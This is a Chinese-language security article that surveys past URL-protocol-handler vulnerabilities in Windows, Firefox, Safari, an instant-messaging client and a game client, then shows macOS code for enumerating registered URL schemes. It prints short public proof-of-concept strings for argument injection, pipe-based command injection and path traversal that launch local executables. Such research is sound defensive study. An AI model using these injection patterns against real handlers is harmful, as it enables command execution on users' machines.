### 漏洞概述与利用详情

#### CVE-2007-3896 和 CVE-2007-3845
这两个漏洞是 CVE-2007-4041 的变体，具体细节在 TrendMicro 的公告中有详细说明。CVE-2007-4041 的详情可以在 Firefox 浏览器的 issue 中找到。其中一个测试用例如下：
```plaintext
Mailto:%
```
由于 URL 中的 "%" 导致解析错误，最终被当作路径执行了命令。

#### MS10-007 (CVE-2010-0027)
2010 年发现了一个类似的漏洞，其根本原因是 `ShellExecute` 函数未能正确处理传入的 URL，错误地将其作为路径处理。公开的 PoC 如下：
```plaintext
xyz://www.example.com#://../../C:/windows/system32/calc.exe
```
通过 `ShellExecute*` 调用即可触发该漏洞。

#### CVE-2007-3670
这是一个影响 Firefox 和 ThunderBird 的伪协议参数注入漏洞。Firefox 注册了一个 `FirefoxURL:` 协议：
```plaintext
[HKEY_CLASSES_ROOT\FirefoxURL\shell\open\command\@]
"C:\\PROGRA~1\\MOZILL~2\\FIREFOX.EXE" -url “%1″ -requestPending
```
攻击者可以通过引号闭合来注入任意参数，例如：
```plaintext
FirefoxURL://foo" --argument "my value
```
最终通过 `-chrome` 参数注入恶意脚本，利用 Firefox 特权域接口实现任意代码执行。

#### CVE-2007-3186
Safari Windows 版也存在类似的问题，一个 PoC 如下：
```plaintext
bar | foobar "arg1'>
```
这将执行：
```plaintext
"C:\Program Files\My Application\myprotocol.exe" "someserver.com"  bar | foobar "arg1"
```
Safari 在打开外部 URL 时可能使用了 `system` 函数，导致这种异常行为。同样地，攻击者通过 `-chrome` 参数实现了跨浏览器脚本攻击。

#### 某聊天软件命令执行
2012 年，某即时通讯软件爆出一个远程命令执行漏洞，成因可能是实现打开网址时没有为其加入 `http://` 前缀而直接传给了 `ShellExecute` 函数，导致域名被系统当成路径名。PoC 如下：
```c
ShellExecuteW(NULL, L"open", L"www.baidu.com..\\..\\", NULL, NULL, SW_SHOW);
```
此代码将打开资源管理器，并指向一个存在的可执行文件，从而实现命令执行。

#### 某游戏客户端命令执行
HITB 2017 上披露了一个通过自定义 URL scheme 执行命令的漏洞。开发者使用 `_mbsstr` 判断网址有效性，而不是检查字符串前缀。最终的 PoC 如下：
```plaintext
qqgameprotocol://shortcut/# URL=c:/windows/system32/http://qq.com/../../calc.exe ICON=3366xs.ico NAME=AAAAAAAA DESC=BBBBB TYPE=1 START=1
```
通过返回上层路径绕过了关键字检测，成功执行任意路径下的可执行文件。

## 寻找 URL Protocol

### Android 和 iOS
Android 下的 `BROWSABLE` 和 iOS 的 `universal link` 已经被广泛研究，但在桌面端的关注度相对较少。以下是一些方法和工具来枚举当前系统中的 URL schemes。

### 枚举系统已注册的伪协议
早在 2009 年出版的《Hacking: The Next Generation》一书中就提到了 URL scheme 在客户端软件中的攻击场景，并提供了三种平台（Windows、OS X、Linux）下枚举系统已注册伪协议的脚本或程序。

#### macOS 示例
macOS 桌面应用传递 URL scheme 使用的是 Apple Event，示例代码如下：
```objc
-(void)applicationWillFinishLaunching:(NSNotification *)aNotification {
    NSAppleEventManager *appleEventManager = [NSAppleEventManager sharedAppleEventManager];
    [appleEventManager setEventHandler:self
                               andSelector:@selector(handleGetURLEvent:withReplyEvent:)
                             forEventClass:kInternetEventClass andEventID:kAEGetURL];
}

- (void)handleGetURLEvent:(NSAppleEventDescriptor *)event withReplyEvent:(NSAppleEventDescriptor *)replyEvent {
    NSURL *url = [NSURL URLWithString:[[event paramDescriptorForKeyword:keyDirectObject] stringValue]];
    // 处理 URL
}
```

#### 枚举 macOS 中的 URL schemes
可以使用以下 C 代码来枚举 macOS 中的 URL schemes：
```c
#import <Foundation/Foundation.h>
#import <CoreServices/CoreServices.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        CFArrayRef schemes;
        CFArrayRef apps;
        _LSCopySchemesAndHandlerURLs(&schemes, &apps);
        for (CFIndex i = 0, count = CFArrayGetCount(schemes); i < count; i++) {
            NSLog(@"Scheme: %@", CFArrayGetValueAtIndex(schemes, i));
        }
    }
    return 0;
}
```
编译并运行此代码可以列出系统中注册的所有 URL schemes。

## 参考资料
1. [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx)
2. [About Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774%28v=vs.85%29.aspx)
3. [Microsoft Security Bulletin MS07-061 - Critical](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2007/ms07-061)
4. [Microsoft Security Bulletin MS10-007 - Critical](https://technet.microsoft.com/library/security/ms10-007)
5. [URI Use and Abuse](https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf)
6. [Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf)